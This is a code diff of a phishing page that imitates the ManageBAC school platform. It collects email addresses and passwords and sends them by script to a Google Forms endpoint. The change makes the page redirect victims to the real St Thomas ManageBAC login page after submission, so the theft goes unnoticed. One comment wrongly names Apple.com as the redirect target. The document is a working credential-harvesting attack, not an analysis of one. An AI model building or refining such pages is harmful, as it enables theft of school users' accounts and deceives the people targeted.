@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>ManageBAC</h1>
-    <form action="https://docs.google.com/forms/d/e/1FAIpQLSeLUzCIfgjmIrQ5_WLAgCwliPWVqVraNd_mS3bSBL7XQs7KfQ/formResponse" method="POST">
+    <form id="googleForm" method="POST">
         <label for="email">Email:</label><br>
         <input type="email" id="name" name="entry.1195553524" required><br><br>
         <label for="password">Password:</label><br>
@@ -15,9 +15,9 @@
         <button type="submit">Submit</button>
       </form>
 
-    <script>
+      <script>
         document.getElementById('googleForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent default form submission
+            event.preventDefault(); // Prevent the default redirect behavior
 
             const form = event.target;
             const formData = new FormData(form);
@@ -28,12 +28,12 @@
                 body: formData,
                 mode: "no-cors" // Prevent CORS issues
             }).then(() => {
-                // Close the current tab
-                window.close();
+                // Redirect to Apple.com after submission
+                window.location.href = "https://stthomas.managebac.com/login";
             }).catch(error => {
                 console.error("Error submitting form:", error);
-                // Still close the tab even if there is an error
-                window.close();
+                // Still redirect even if there is an error
+                window.location.href = "https://stthomas.managebac.com/login";
             });
         });
     </script>
